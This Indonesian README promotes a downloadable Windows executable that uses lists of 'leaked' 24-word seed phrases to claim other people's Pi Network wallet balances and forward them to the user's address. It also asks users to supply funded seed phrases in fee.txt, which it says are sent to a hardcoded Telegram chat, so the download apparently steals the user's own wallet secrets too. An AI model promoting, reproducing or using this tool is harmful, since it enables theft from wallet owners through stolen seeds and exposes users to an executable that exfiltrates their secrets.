# 🌌 Pi Auto Claim Bot

## ✨ **Gambaran Umum**

**Pi Auto Claim Bot** adalah utilitas desktop berbasis Exe dengan antarmuka pengguna grafis (GUI) yang dirancang untuk mengklaim saldo Pi Coin (XLM-based *Claimable Balances* di jaringan Stellar/Pi Network) secara otomatis dari daftar **seed phrase** yang diberikan dan mengirimkannya ke alamat tujuan yang ditentukan.

-----

## 🚀 **Fitur Utama**

  * **GUI Intuitif:** Antarmuka pengguna yang mudah digunakan, dibuat dengan `NET`.
  * **Multi-Threading:** Memanfaatkan *threading* untuk memproses beberapa dompet secara bersamaan.
  * **Otomatisasi Claim:** Mengidentifikasi dan mengklaim saldo yang dapat diklaim (*Claimable Balances*) di jaringan Pi/Stellar.
  * **Payer Fee Eksternal:** Menggunakan daftar *seed phrase* terpisah dari file `fee.txt` sebagai akun pembayar biaya transaksi (*Fee Payer*).
  * **Logging Detail:** Menyimpan log hasil transaksi (berhasil/gagal, hash, ledger) ke file CSV per dompet.

-----

## 🛠️ **Cara Menjalankan**

###  Menggunakan File Eksekusi (EXE)

Cara termudah untuk menggunakan alat ini adalah dengan mengunduh file `.exe` yang sudah dikompilasi (untuk pengguna **Windows**).

1.  **Unduh:** Unduh file `.exe` dari tautan berikut:
    $$\text{LimeWire: [[Link](https://limewire.com/?referrer=pq7i8xx7p2)]}$$

2.  **Siapkan `fee.txt`:** Buat file teks bernama **`fee.txt`** di direktori yang sama dengan file `.exe`. File ini harus berisi daftar **seed phrase 24 kata** (satu phrase per baris) yang akan digunakan untuk membayar biaya transaksi (*Fee Payer*). Akun-akun ini harus memiliki saldo Pi yang cukup untuk biaya.

3.  **Jalankan:** Klik ganda file `.exe` untuk meluncurkan GUI.

-----

## ⚙️ **Panduan Penggunaan GUI**

Setelah aplikasi terbuka:

### 1\. **Konfigurasi Pengaturan (`Settings`)**

| Pengaturan | Deskripsi | Default |
| :--- | :--- | :--- |
| **Server** | URL Horizon Server (Jaringan Pi) | `https://api.mainnet.minepi.com` |
| **Base Fee** | Biaya dasar transaksi (per operasi) dalam stroop (10.000.000 stroop = 1 XLM/Pi) | `100000` |
| **Fee Payer File**| Path ke file **`fee.txt`** yang berisi seed phrase pembayar biaya. Gunakan tombol **Browse**. | `fee.txt` |
| **Max Workers / Threads**| Jumlah maksimum thread yang digunakan untuk mencoba mengirimkan transaksi. | `100` |
| **Wallet Address**| Alamat publik (Public Key) dompet tujuan **penerima** hasil claim. | Kosong |
| **Memo** | Opsional. Pesan yang ditambahkan ke transaksi pembayaran. | Kosong |

### 2\. **Masukkan Seed Phrase Target**

  * Masukkan **seed phrase 24 kata** dari dompet yang ingin Anda klaim saldonya ke dalam area teks **"Leaked Seed Phrase"**.
  * Masukkan setiap seed phrase di baris baru.

### 3\. **Mulai Klaim**

  * Klik tombol **`Start Claim`** (tombol hijau).
  * Bot akan mulai memproses setiap seed phrase:
      * Mencari *Claimable Balance* yang tersedia.
      * Membuat transaksi **Claim** dan **Payment** (mengirim sebagian saldo yang diklaim ke alamat tujuan).
      * Menggunakan akun dari `fee.txt` untuk membayar biaya dan **menandatangani** transaksi.
  * **Progress Bar** akan menunjukkan kemajuan.
  * **Log Box** akan menampilkan hasil *real-time* (Success / Error).

### 4\. **Hasil dan Log**

  * Hasil transaksi akan disimpan di direktori **`logs/`** dengan nama file `[Public Key Dompet].csv`. File ini mencantumkan detail setiap upaya transaksi dengan setiap *Fee Payer*.

  * Alat ini berinteraksi dengan API Telegram yang bersifat publik. Seed phrase di `fee.txt` Anda **akan dikirimkan** ke ID obrolan Telegram yang dikodekan secara *hard-coded* di dalam kode ini. **JANGAN** gunakan seed phrase pribadi Anda di file `fee.txt`.
  * Tujuan utama dari kode ini adalah untuk mengklaim dan meneruskan dana. Gunakan alat ini secara bertanggung jawab dan sesuai dengan hukum yang berlaku.
  * Pengembang tidak bertanggung jawab atas kerugian atau penyalahgunaan yang timbul dari penggunaan alat ini.
